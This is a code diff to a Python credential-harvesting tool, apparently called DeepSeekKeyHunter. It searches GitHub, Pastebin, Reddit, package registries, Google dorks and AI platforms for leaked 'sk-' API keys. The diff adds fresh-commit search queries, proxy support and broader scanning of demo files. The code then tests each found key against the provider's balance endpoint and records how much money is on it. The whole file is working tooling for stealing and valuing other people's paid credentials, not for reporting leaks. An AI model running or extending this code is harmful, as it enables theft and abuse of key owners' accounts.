@@ -22,7 +22,6 @@ from typing import Callable, Optional
 from scanners.base import extract_keys as scanner_extract_keys, is_bad_key as _scanner_is_bad_key
 from scanners.github_gist import GistScanner
 from scanners.github_issues import IssuesScanner
-from scanners.github_events import EventsMonitor
 from scanners.github_commits import CommitsScanner
 from scanners.gitlab import GitLabScanner
 from scanners.wayback import WaybackScanner
@@ -33,6 +32,12 @@ from scanners.npm_registry import NpmScanner
 from scanners.huggingface import HuggingFaceScanner
 from scanners.pypi import PyPIScanner
 from scanners.stackoverflow import StackOverflowScanner
+from scanners.github_raw import GitHubRawScanner
+from scanners.pastebin import PastebinScanner
+from scanners.replicate import ReplicateScanner
+from scanners.ai_platforms import CivitaiScanner, TogetherAIScanner, ModalScanner, GroqScanner, DeepInfraScanner, FalAIScanner
+from scanners.google_dork import GoogleDorkScanner
+from scanners.reddit import RedditScanner
 
 if sys.platform == "win32":
     sys.stdout.reconfigure(encoding="utf-8", errors="replace")
@@ -41,7 +46,7 @@ if sys.platform == "win32":
 # 默认汇率（1 USD = ? CNY）
 DEFAULT_USD_CNY_RATE = 7.25
 
-KEY_PATTERN = re.compile(r"sk-[a-zA-Z0-9]{32,64}")
+KEY_PATTERN = re.compile(r"sk-(?:proj-)?[a-zA-Z0-9]{32,64}")
 
 # ═══════════════════════════════════════════════════════════════════
 #  终极查询库 (75条) — 按热度排序 (高产出 → 低产出)
@@ -440,6 +445,99 @@ BUILTIN_QUERIES = [
 ]
 
 
+def generate_rolling_time_queries(base: list = None) -> list:
+    """根据当前日期动态生成滚动时间窗口查询。
+    替代硬编码的过期日期查询（如 pushed:>2026-05-01），保证每次扫描都抓最新提交。
+    生成 7天/30天 两个窗口 × 高产出文件类型，共约 16 条。
+    返回的列表会追加到静态查询之后。"""
+    from datetime import datetime, timedelta
+    today = datetime.now().date()
+    d7 = (today - timedelta(days=7)).strftime("%Y-%m-%d")
+    d30 = (today - timedelta(days=30)).strftime("%Y-%m-%d")
+
+    # 高产出文件类型（基于历史数据分析）
+    hot_exts = ["env", "java", "py", "js", "yml", "json", "kt", "ts", "go", "php"]
+
+    queries = [
+        # 宽口径：最近7天 / 最近30天的全部新提交（优先级最高）
+        f"deepseek sk- pushed:>{d7}",
+        f"deepseek sk- pushed:>{d30}",
+        # 7天窗口按高产出文件类型细化（避免被宽口径的结果数限制截断）
+        *[f"deepseek sk- filename:{ext} pushed:>{d7}" for ext in hot_exts[:6]],
+        # 30天窗口补充其余文件类型
+        *[f"deepseek sk- filename:{ext} pushed:>{d30}" for ext in hot_exts[6:]],
+        # 配置文件 + 新提交（最高价值的泄露形态）
+        f"deepseek sk- filename:env pushed:>{d30}",
+        f"DEEPSEEK_API_KEY sk- pushed:>{d30}",
+    ]
+    # 去重保序
+    seen = set()
+    out = []
+    for q in queries:
+        if q not in seen:
+            seen.add(q)
+            out.append(q)
+    return out
+
+
+def build_active_queries(base: list = None) -> list:
+    """构建完整查询集：静态高质量查询 + 动态滚动时间窗口查询。
+    移除已过期的硬编码日期查询，注入新鲜的动态查询。"""
+    base = base if base is not None else BUILTIN_QUERIES
+    # 过滤掉过期的硬编码日期查询（2026-05 及更早，已无法抓到最新数据）
+    filtered = []
+    for q in base:
+        # 保留无时间窗口的静态查询
+        if "pushed:" not in q:
+            filtered.append(q)
+            continue
+        # 时间窗口查询：删除所有硬编码的（统一用动态生成的替代）
+        # 保留 pushed:>2025-01-01 这种超宽窗口作为历史回溯兜底
+        if "pushed:>2025-01-01" in q:
+            filtered.append(q)
+    # 静态查询（去掉冗余时间窗口后）+ 动态滚动窗口
+    return filtered + generate_rolling_time_queries()
+
+
+def load_tiered_queries(filepath: str = "queries_v5.txt") -> list[dict]:
+    """Load queries with tier information from a text file.
+    Format: tier|query  (e.g. "1|deepseek sk- filename:java")
+    Returns list of {"tier": int, "query": str, "pages": int}
+    """
+    tier_pages = {
+        1: 5, 2: 5, 3: 5, 4: 5, 5: 5,       # High yield: 5 pages
+        6: 3, 7: 3, 8: 3, 9: 3, 10: 3,       # Medium yield: 3 pages
+        11: 2, 12: 2, 13: 2,                  # Low yield: 2 pages
+        14: 1, 15: 1, 16: 1, 17: 1, 18: 1,   # Experimental: 1 page
+        19: 1, 20: 1,
+    }
+    queries = []
+    try:
+        with open(filepath, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                if "|" in line:
+                    parts = line.split("|", 1)
+                    try:
+                        tier = int(parts[0].strip())
+                        query = parts[1].strip()
+                        if query:
+                            pages = tier_pages.get(tier, 2)
+                            queries.append({"tier": tier, "query": query, "pages": pages})
+                    except ValueError:
+                        pass
+    except FileNotFoundError:
+        pass
+    return queries
+
+
+def get_flat_queries(tiered: list[dict]) -> list[str]:
+    """Extract just the query strings from tiered queries."""
+    return [q["query"] for q in tiered]
+
+
 def is_bad_key(key: str, extra_bad: list = None) -> bool:
     return _scanner_is_bad_key(key, extra_bad)
 
@@ -475,6 +573,7 @@ class ScannerEngine:
                  max_valid_keys: int = 0,
                  auto_save_interval: int = 0,
                  scan_pages: int = 5,
+                 proxy: str = None,
                  ):
         self.concurrency = concurrency
         self.timeout = timeout
@@ -489,6 +588,7 @@ class ScannerEngine:
         self.extra_bad_patterns = extra_bad_patterns or []
         self.log_callback = log_callback or (lambda msg, level="info": print(msg))
         self.progress_callback = progress_callback or (lambda cur, total, phase: None)
+        self.proxy = proxy
 
         # 退出机制
         self.max_duration = max_duration
@@ -497,7 +597,7 @@ class ScannerEngine:
         self.scan_pages = max(1, min(10, scan_pages or 10))  # 默认10页, 限1-10
 
         self.key_pattern = re.compile(
-            rf"sk-[a-zA-Z0-9]{{{min_key_length},{max_key_length}}}"
+            rf"sk-(?:proj-)?[a-zA-Z0-9]{{{min_key_length},{max_key_length}}}"
         )
         self._stop_requested = False
         self._start_time = time.time()
@@ -505,8 +605,6 @@ class ScannerEngine:
         self._saved_count = 0
         self.results = []
         self.all_keys = {}
-
-    _gh_authenticated = None  # class-level cache
 
     @staticmethod
     def check_gh_auth() -> bool:
@@ -679,18 +777,29 @@ class ScannerEngine:
 
         scanner_map = {
             "github": ("GitHub Code Search", queries or BUILTIN_QUERIES),
-            "gist": ("GitHub Gists", None),
-            "issues": ("GitHub Issues/PRs", None),
-            "commits": ("GitHub Commit History", None),
-            "gitlab": ("GitLab", None),
-            "wayback": ("Wayback Machine", None),
-            "docker": ("Docker Hub", None),
-            "commoncrawl": ("Common Crawl", None),
-            "gitee": ("Gitee 码云", None),
-            "npm": ("npm Registry", None),
-            "huggingface": ("HuggingFace", None),
-            "pypi": ("PyPI Registry", None),
-            "stackoverflow": ("Stack Overflow", None),
+            "gist": ("GitHub Gists", [None]),
+            "issues": ("GitHub Issues/PRs", [None]),
+            "commits": ("GitHub Commit History", [None]),
+            "gitlab": ("GitLab", ["deepseek", "sk- api_key", "deepseek api"]),
+            "wayback": ("Wayback Machine", [None]),
+            "docker": ("Docker Hub", ["deepseek"]),
+            "commoncrawl": ("Common Crawl", ["github.com"]),
+            "gitee": ("Gitee 码云", ["deepseek", "sk- api_key", "deepseek api"]),
+            "npm": ("npm Registry", ["deepseek", "deepseek-sdk", "deepseek-client"]),
+            "huggingface": ("HuggingFace", ["deepseek", "deepseek api", "sk- deepseek"]),
+            "pypi": ("PyPI Registry", ["deepseek", "deepseek-sdk", "deepseek-api"]),
+            "stackoverflow": ("Stack Overflow", ["deepseek sk-", "deepseek api key", "sk- deepseek"]),
+            "github_raw": ("GitHub Raw (宽泛sk-搜索)", [None]),
+            "pastebin": ("Pastebin", [None]),
+            "replicate": ("Replicate AI", [None]),
+            "civitai": ("Civitai", [None]),
+            "together_ai": ("Together AI", [None]),
+            "modal": ("Modal", ["deepseek"]),
+            "groq": ("Groq", [None]),
+            "deepinfra": ("DeepInfra", [None]),
+            "fal_ai": ("Fal.ai", [None]),
+            "google_dork": ("Google Dork", [None]),
+            "reddit": ("Reddit", [None]),
         }
 
         self.log(f"多源扫描启动: {len(sources)} 个来源 -> {[scanner_map[s][0] for s in sources]}")
@@ -759,94 +868,117 @@ class ScannerEngine:
         return all_results
 
     # Scanner factory: (class, search_term, extra_init_kwargs)
-    _SCANNER_REGISTRY = None
-
     def _get_scanner_registry(self, github_token: str = "", gitlab_token: str = "",
                               gitee_token: str = ""):
-        if self._SCANNER_REGISTRY is None:
-            ScannerEngine._SCANNER_REGISTRY = {
-                "gist": (GistScanner, None, {"token": github_token}),
-                "issues": (IssuesScanner, '"sk-"', {"token": github_token}),
-                "commits": (CommitsScanner, None, {"token": github_token}),
-                "gitlab": (GitLabScanner, "deepseek", {"token": gitlab_token, "max_projects": 100}),
-                "wayback": (WaybackScanner, "github.com", {"max_snapshots": 100}),
-                "docker": (DockerHubScanner, "deepseek", {"max_images": 50}),
-                "commoncrawl": (CommonCrawlScanner, "github.com", {"max_urls": 200}),
-                "gitee": (GiteeScanner, "deepseek", {"token": gitee_token, "max_repos": 100}),
-                "npm": (NpmScanner, "deepseek", {"max_packages": 50}),
-                "huggingface": (HuggingFaceScanner, "deepseek", {"max_items": 150}),
-                "pypi": (PyPIScanner, "deepseek", {"max_packages": 150}),
-                "stackoverflow": (StackOverflowScanner, "deepseek", {"max_posts": 200}),
-            }
-        return ScannerEngine._SCANNER_REGISTRY
+        # 每次调用都重建 registry，避免 class-level 缓存导致的 stale proxy 问题
+        return {
+            "gist": (GistScanner, None, {"token": github_token, "proxy": self.proxy}),
+            "issues": (IssuesScanner, '"sk-"', {"token": github_token, "proxy": self.proxy}),
+            "commits": (CommitsScanner, None, {"token": github_token, "proxy": self.proxy}),
+            "gitlab": (GitLabScanner, "deepseek", {"token": gitlab_token, "max_projects": 100, "proxy": self.proxy}),
+            "wayback": (WaybackScanner, None, {"max_snapshots": 100, "proxy": self.proxy}),
+            "docker": (DockerHubScanner, "deepseek", {"max_images": 50, "proxy": self.proxy}),
+            "commoncrawl": (CommonCrawlScanner, "github.com", {"max_urls": 150, "proxy": self.proxy}),
+            "gitee": (GiteeScanner, "deepseek", {"token": gitee_token, "max_repos": 100, "proxy": self.proxy}),
+            "npm": (NpmScanner, "deepseek", {"max_packages": 30, "proxy": self.proxy}),
+            "huggingface": (HuggingFaceScanner, "deepseek", {"max_items": 30, "proxy": self.proxy}),
+            "pypi": (PyPIScanner, "deepseek", {"max_packages": 30, "proxy": self.proxy}),
+            "stackoverflow": (StackOverflowScanner, "deepseek", {"max_posts": 50, "proxy": self.proxy}),
+            "github_raw": (GitHubRawScanner, None, {"token": github_token, "proxy": self.proxy}),
+            "pastebin": (PastebinScanner, None, {"proxy": self.proxy}),
+            "replicate": (ReplicateScanner, None, {"proxy": self.proxy}),
+            "civitai": (CivitaiScanner, None, {"proxy": self.proxy}),
+            "together_ai": (TogetherAIScanner, None, {"proxy": self.proxy}),
+            "modal": (ModalScanner, "deepseek", {"proxy": self.proxy}),
+            "groq": (GroqScanner, None, {"proxy": self.proxy}),
+            "deepinfra": (DeepInfraScanner, None, {"proxy": self.proxy}),
+            "fal_ai": (FalAIScanner, None, {"proxy": self.proxy}),
+            "google_dork": (GoogleDorkScanner, None, {"proxy": self.proxy}),
+            "reddit": (RedditScanner, None, {"proxy": self.proxy}),
+        }
 
     def _run_one_scanner(self, source: str, queries: list = None,
                          github_token: str = "", gitlab_token: str = "",
                          gitee_token: str = "") -> dict:
-        """Run a single scanner by name and return discovered keys dict."""
+        """Run a single scanner by name and return discovered keys dict.
+        If queries is a list of search terms, the scanner runs multiple times
+        with different search queries (for external platforms).
+        """
         discovered = {}
+
+        # GitHub source uses synchronous _scan_one_query (which has its own asyncio.run),
+        # so handle it outside the async wrapper to avoid nested event loops.
+        if source == "github":
+            _queries = queries if queries else BUILTIN_QUERIES
+            for query in _queries[:50]:
+                if self._should_stop():
+                    break
+                batch = self._scan_one_query(query)
+                for k, v in batch.items():
+                    if k not in discovered:
+                        discovered[k] = v
+                time.sleep(self.search_delay)
+            return discovered
 
         async def _do():
             nonlocal discovered
-            if source == "github":
-                if not queries:
-                    queries = BUILTIN_QUERIES
-                for query in queries[:50]:
-                    if self._should_stop():
-                        break
-                    batch = self._scan_one_query(query)
-                    for k, v in batch.items():
-                        if k not in discovered:
-                            discovered[k] = v
-                    time.sleep(self.search_delay)
-                return
-
             registry = self._get_scanner_registry(github_token, gitlab_token, gitee_token)
-            scanner_cls, search_term, extra_kwargs = registry.get(source, (None, None, {}))
+            scanner_cls, default_term, extra_kwargs = registry.get(source, (None, None, {}))
             if scanner_cls is None:
                 return
 
+            # Determine search terms: use provided queries or default from registry
+            search_terms = queries if queries else [default_term]
+
             scanner = scanner_cls(concurrency=self.concurrency, timeout=self.timeout, **extra_kwargs)
-            results = await scanner.search(search_term)
-            for r in results:
-                k = r["key"]
-                if k not in discovered:
-                    discovered[k] = {
-                        "key": k,
-                        "key_preview": r.get("key_preview", k[:10] + "..." + k[-4:]),
-                        "repos": [{"repo": r.get("repo", ""), "file": r.get("file", ""),
-                                   "url": r.get("url", "")}],
-                    }
+            for term in search_terms:
+                if self._should_stop():
+                    break
+                try:
+                    results = await scanner.search(term)
+                    for r in results:
+                        k = r["key"]
+                        if k not in discovered:
+                            discovered[k] = {
+                                "key": k,
+                                "key_preview": r.get("key_preview", k[:10] + "..." + k[-4:]),
+                                "repos": [{"repo": r.get("repo", ""), "file": r.get("file", ""),
+                                           "url": r.get("url", "")}],
+                            }
+                except Exception as e:
+                    self.log(f"  Scanner {source} query '{term}' failed: {e}", "warning")
 
         asyncio.run(_do())
         return discovered
 
     def _is_likely_test_key(self, file_path: str, repo: str) -> bool:
-        """Pre-filter to skip test/demo files and build artifacts.
-        Test files often contain real keys with balance, so we only skip
-        unambiguous low-value patterns."""
+        """Pre-filter to skip build artifacts and known test duplicates.
+        Only skip unambiguous low-value patterns — real keys often appear
+        in demo/example/sample files."""
         lower = (file_path + "/" + repo).lower()
-        # Build artifacts
+        # Build artifacts only
         for kw in ["/target/site/", "/target/classes/", "/build/resources/",
-                    "/bin/main/", "/.html"]:
+                    "/bin/main/"]:
             if kw in lower:
                 return True
-        # Common test/demo paths that are almost always zero-balance
-        for kw in ["/test/java/", "/test/kotlin/", "testdeepseek", "tongyichat",
-                   "/demo/", "/examples/", "/sample/", "/samples/",
-                   "/tests/", "/__tests__/", "/spec/", "/fixtures/"]:
+        # Known duplicate test files that produce noise
+        for kw in ["testdeepseek", "tongyichat",
+                   "TongYiChatModelTests", "DeepSeekChatModelTests"]:
             if kw in lower:
                 return True
         return False
 
     def _scan_one_query(self, query: str) -> dict:
-        """扫描单条查询: 取最多 N 页 (每页100条), 异步并发抓取原始文件"""
+        """扫描单条查询: 取最多 N 页 (每页100条)
+        优先使用 text_matches 直接提取 Key (快速), 如果没找到再下载原始文件"""
         max_pages_to_fetch = getattr(self, 'scan_pages', 5)
+        # 页间延迟：无认证用户至少 6s (10 req/min)，有认证用户用 search_delay
+        page_delay = max(self.search_delay, 6.0) if not ScannerEngine.check_gh_auth() else self.search_delay
         items = []
         for page in range(1, max_pages_to_fetch + 1):
             if page > 1:
-                time.sleep(4.0)  # 页间延迟 4s — 30/min 限制下安全
-            batch = self._gh_search(query, per_page=100, page=page)
+                time.sleep(page_delay)  # 页间延迟 — 根据认证状态自动调整
+            batch = self._gh_search(query, per_page=100, page=page, with_text_matches=True)
             if not batch:
                 break
             items.extend(batch)
@@ -854,16 +986,54 @@ class ScannerEngine:
                 break
         if not items:
             return {}
-        return asyncio.run(self._scan_one_query_async(items))
 
-    async def _scan_one_query_async(self, items: list) -> dict:
-        """异步并发抓取所有文件并提取 Key"""
+        # 优先使用 text_matches 直接提取 Key (无需下载原始文件, 速度快 100 倍)
+        keys_from_text = self._extract_keys_from_text_matches(items)
+        if keys_from_text:
+            self.log(f"  text_matches 提取: {len(keys_from_text)} 个 Key")
+            return keys_from_text
+
+        # 如果 text_matches 没找到, 回退到下载原始文件
+        self.log(f"  text_matches 无结果, 回退到原始文件下载...")
+        return self._scan_one_query_threaded(items)
+
+    def _extract_keys_from_text_matches(self, items: list) -> dict:
+        """Extract keys directly from GitHub search text_matches (fast, no raw file fetch needed)."""
+        all_keys = {}
+        for item in items:
+            repo = item.get("repository", {}).get("full_name", "")
+            path = item.get("path", "")
+            html_url = item.get("html_url", "")
+            if not repo or not path:
+                continue
+            if any(fnmatch.fnmatch(repo, p) for p in self.exclude_repos):
+                continue
+            if self._is_likely_test_key(path, repo):
+                continue
+
+            text_matches = item.get("text_matches", [])
+            for match in text_matches:
+                fragment = match.get("fragment", "")
+                keys = self.key_pattern.findall(fragment)
+                for k in keys:
+                    if not is_bad_key(k, self.extra_bad_patterns):
+                        if k not in all_keys:
+                            all_keys[k] = {"key": k, "key_preview": k[:10] + "..." + k[-4:], "repos": []}
+                        if repo not in [r["repo"] for r in all_keys[k]["repos"]]:
+                            all_keys[k]["repos"].append({"repo": repo, "file": path, "url": html_url})
+                            self.log(f"  [KEY] {k[:10]}...{k[-4:]} | {repo}/{path}")
+        return all_keys
+
+    def _scan_one_query_threaded(self, items: list) -> dict:
+        """Threaded concurrent fetch of raw files and key extraction.
+        Uses requests + ThreadPoolExecutor instead of aiohttp for Windows compatibility."""
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+
         all_keys = {}
         seen = set()
-        seen_lock = asyncio.Lock()
-        sem = asyncio.Semaphore(15)  # 并发抓取 15 个文件
+        seen_lock = __import__('threading').Lock()
 
-        async def fetch_and_extract(item):
+        def fetch_and_extract(item):
             repo = item.get("repository", {}).get("full_name", "")
             path = item.get("path", "")
             html_url = item.get("html_url", "")
@@ -871,13 +1041,11 @@ class ScannerEngine:
                 return []
             if any(fnmatch.fnmatch(repo, p) for p in self.exclude_repos):
                 return []
-            # Skip test/demo files (vast majority are zero-balance)
             if self._is_likely_test_key(path, repo):
                 return []
 
-            # 线程安全的去重检查
             cache = f"{repo}/{path}"
-            async with seen_lock:
+            with seen_lock:
                 if cache in seen:
                     return []
                 seen.add(cache)
@@ -886,57 +1054,130 @@ class ScannerEngine:
             if "/blob/" in html_url:
                 branch = html_url.split("/blob/")[1].split("/")[0]
 
-            text = await self._fetch_raw_async(sem, repo, path, branch)
+            text = self._fetch_raw(repo, path, branch)
             if not text:
                 return []
 
             keys = self.key_pattern.findall(text)
             keys = [k for k in keys if not is_bad_key(k, self.extra_bad_patterns)]
-            result = []
-            for k in keys:
-                result.append((k, repo, path, html_url))
-            return result
+            return [(k, repo, path, html_url) for k in keys]
 
-        async with aiohttp.ClientSession() as session:
-            self._async_session = session
-            tasks = [fetch_and_extract(item) for item in items]
-            batch_results = await asyncio.gather(*tasks)
-            self._async_session = None
-
-        for results in batch_results:
-            for k, repo, path, html_url in results:
-                if k not in all_keys:
-                    all_keys[k] = {"key": k, "key_preview": k[:10] + "..." + k[-4:], "repos": []}
-                if repo not in [r["repo"] for r in all_keys[k]["repos"]]:
-                    all_keys[k]["repos"].append({"repo": repo, "file": path, "url": html_url})
-                    self.log(f"  [KEY] {k[:10]}...{k[-4:]} | {repo}/{path}")
+        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
+            futures = {executor.submit(fetch_and_extract, item): item for item in items}
+            for future in as_completed(futures):
+                try:
+                    results = future.result(timeout=30)
+                except Exception:
+                    continue
+                for k, repo, path, html_url in results:
+                    if k not in all_keys:
+                        all_keys[k] = {"key": k, "key_preview": k[:10] + "..." + k[-4:], "repos": []}
+                    if repo not in [r["repo"] for r in all_keys[k]["repos"]]:
+                        all_keys[k]["repos"].append({"repo": repo, "file": path, "url": html_url})
+                        self.log(f"  [KEY] {k[:10]}...{k[-4:]} | {repo}/{path}")
 
         return all_keys
 
-    async def _fetch_raw_async(self, sem: asyncio.Semaphore, repo: str, path: str, branch: str = "main") -> str:
-        """异步抓取原始文件内容 (尝试多个分支名)"""
-        async with sem:
-            tried = set()
-            for br in [branch, "main", "master", "develop", "dev", "HEAD"]:
-                if br in tried:
-                    continue
-                tried.add(br)
-                url = f"https://raw.githubusercontent.com/{repo}/{br}/{path}"
-                try:
-                    async with self._async_session.get(url,
-                                                        timeout=aiohttp.ClientTimeout(total=8),
-                                                        headers={"User-Agent": "Mozilla/5.0"}) as resp:
-                        if resp.status == 200:
-                            return await resp.text()
-                except Exception:
-                    pass
-            return ""
-
     def _verify_dict(self, keys_dict: dict) -> list:
-        """验证一个 key 字典, 返回结果列表"""
+        """验证一个 key 字典, 返回结果列表 (使用 requests + ThreadPoolExecutor)"""
         if not keys_dict:
             return []
-        return asyncio.run(self._verify_all_async(keys_dict))
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+        import threading
+
+        results = []
+        done_count = [0]
+        valid_count = [0]
+        total = len(keys_dict)
+        lock = threading.Lock()
+
+        def verify_one(api_key):
+            url = f"{self.deepseek_api_base}/user/balance"
+            headers = {"Authorization": f"Bearer {api_key}"}
+            for attempt in range(3):
+                try:
+                    r = requests.get(url, headers=headers, timeout=self.timeout)
+                    if r.status_code == 200:
+                        data = r.json()
+                        balance_infos = data.get("balance_infos", [])
+                        total_balance = 0.0
+                        details = []
+                        primary_currency = "USD"
+                        for info in balance_infos:
+                            currency = info.get("currency", "unknown")
+                            total_b = float(info.get("total_balance", 0))
+                            granted = float(info.get("granted_balance", 0))
+                            tipped = float(info.get("tipped_balance", 0))
+                            total_balance += total_b
+                            details.append({
+                                "currency": currency,
+                                "total_balance": total_b,
+                                "granted_balance": granted,
+                                "tipped_balance": tipped,
+                            })
+                            if currency == "CNY":
+                                primary_currency = "CNY"
+                        return {"valid": True, "total_balance": total_balance,
+                                "balance_details": details, "primary_currency": primary_currency}
+                    elif r.status_code == 401:
+                        return {"valid": False, "reason": "invalid"}
+                    elif r.status_code == 429:
+                        # 限流重试
+                        wait = min(2 ** attempt * 2, 10)
+                        time.sleep(wait)
+                        continue
+                    else:
+                        return {"valid": False, "reason": f"HTTP {r.status_code}"}
+                except requests.Timeout:
+                    return {"valid": False, "reason": "timeout"}
+                except Exception as e:
+                    if attempt < 2:
+                        time.sleep(1)
+                        continue
+                    return {"valid": False, "reason": str(e)[:80]}
+            return {"valid": False, "reason": "rate_limited"}
+
+        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
+            futures = {executor.submit(verify_one, key): (key, info) for key, info in keys_dict.items()}
+            for future in as_completed(futures):
+                key, info = futures[future]
+                try:
+                    v = future.result(timeout=self.timeout + 5)
+                except Exception as e:
+                    v = {"valid": False, "reason": str(e)[:80]}
+
+                with lock:
+                    done_count[0] += 1
+                    if v.get("valid"):
+                        valid_count[0] += 1
+                        self._valid_count = valid_count[0]
+                        primary_cur = v.get("primary_currency", "USD")
+                        usd_eq = convert_to_usd(v["total_balance"], primary_cur, self.usd_cny_rate)
+                        cny_eq = convert_to_cny(v["total_balance"], primary_cur, self.usd_cny_rate)
+                        self.log(f"  [{done_count[0]}/{total}] {key[:10]}...{key[-4:]} -> "
+                                 f"{primary_cur} {v['total_balance']:.4f} (≈${usd_eq:.2f} / ¥{cny_eq:.2f})")
+                    else:
+                        self.log(f"  [{done_count[0]}/{total}] {key[:10]}...{key[-4:]} -> {v.get('reason', '?')}")
+
+                    self.progress_callback(done_count[0], total, "verify")
+
+                    entry = {
+                        "key": key,
+                        "key_preview": info["key_preview"],
+                        "valid": v.get("valid", False),
+                        "balance": v.get("total_balance", 0),
+                        "balance_usd": convert_to_usd(v.get("total_balance", 0),
+                                                       v.get("primary_currency", "USD"), self.usd_cny_rate),
+                        "balance_cny": convert_to_cny(v.get("total_balance", 0),
+                                                       v.get("primary_currency", "USD"), self.usd_cny_rate),
+                        "primary_currency": v.get("primary_currency", "USD"),
+                        "balance_details": v.get("balance_details", []),
+                        "repos": info.get("repos", []),
+                        "verified_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    }
+                    results.append(entry)
+
+        return results
 
     def _save_incremental(self, valid_results: list, round_idx: int, total_rounds: int):
         """增量保存: JSON + CSV 全部覆写（CSV 不再追加，避免重复）"""
@@ -1032,33 +1273,18 @@ class ScannerEngine:
             return f"达到有效 Key 数量目标 ({self.max_valid_keys})"
         return ""
 
-    def _auto_save(self, results: list, force: bool = False):
-        n = len(results)
-        if not force and n - self._saved_count < self.auto_save_interval:
-            return
-        self._saved_count = n
-        os.makedirs(self.output_dir, exist_ok=True)
-        # Save sorted results as JSON
-        sorted_r = self.sort_results(results)
-        path = os.path.join(self.output_dir, "deepseek_keys_autosave.json")
-        try:
-            with open(path, "w", encoding="utf-8") as f:
-                json.dump(sorted_r, f, ensure_ascii=False, indent=2)
-            self.log(f"实时保存: {n} 条结果 → {path}", "info")
-        except Exception as e:
-            pass  # silent fail for autosave
-
     # ---- GitHub Search ----
 
-    def _gh_search(self, query: str, per_page: int = 100, page: int = 1) -> list:
+    def _gh_search(self, query: str, per_page: int = 100, page: int = 1, with_text_matches: bool = False) -> list:
         """GitHub Code Search via direct HTTP API (no gh CLI dependency).
-        Uses token from env var or gh CLI for authenticated access (30 req/min).
-        Tracks X-RateLimit-Remaining to avoid hitting the rate limit."""
+        Uses token from env var or gh CLI for authenticated access (10 req/min).
+        Tracks X-RateLimit-Remaining to avoid hitting the rate limit.
+        If with_text_matches=True, returns items with text_matches field for direct key extraction."""
         encoded = urllib.parse.quote(query, safe=":+")
         url = f"https://api.github.com/search/code?q={encoded}&per_page={per_page}&page={page}"
         token = self.get_gh_token()
         headers = {
-            "Accept": "application/vnd.github+json",
+            "Accept": "application/vnd.github.text-match+json" if with_text_matches else "application/vnd.github+json",
             "User-Agent": "DeepSeekKeyHunter/5.0",
             "X-GitHub-Api-Version": "2022-11-28",
         }
@@ -1072,9 +1298,10 @@ class ScannerEngine:
                 remaining = r.headers.get("X-RateLimit-Remaining")
                 if remaining:
                     remaining = int(remaining)
-                    if remaining < 5:
+                    # Code Search API 限流是 10 次/分钟，需要更保守
+                    if remaining < 3:
                         reset_ts = int(r.headers.get("X-RateLimit-Reset", 0))
-                        wait = max(5, reset_ts - int(time.time()) + 1) if reset_ts else 30
+                        wait = max(10, reset_ts - int(time.time()) + 2) if reset_ts else 60
                         self.log(f"GitHub 限流预警: 剩余 {remaining} 次, 等待 {wait}s", "warning")
                         time.sleep(wait)
 
